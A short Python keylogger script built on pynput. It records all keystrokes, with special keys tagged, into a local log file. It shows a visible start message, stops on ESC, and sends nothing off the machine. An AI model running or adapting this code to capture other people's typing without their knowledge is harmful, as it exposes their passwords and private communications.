from pynput import keyboard
from datetime import datetime

LOG_FILE = "keyfile.txt"

def write(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)

def on_press(key):
    try:
        # Normal characters
        write(key.char)
    except AttributeError:
        # Special keys formatting
        if key == keyboard.Key.space:
            write(" ")
        elif key == keyboard.Key.enter:
            write("\n")
        elif key == keyboard.Key.backspace:
            write("[BS]")
        elif key == keyboard.Key.tab:
            write("[TAB]")
        else:
            write(f"[{key.name.upper()}]")

def on_release(key):
    if key == keyboard.Key.esc:
        write("\n\n--- Session Ended ---\n")
        return False

if __name__ == "__main__":
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write(f"\n\n--- New Session | {start_time} ---\n")

    print("Logging started... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()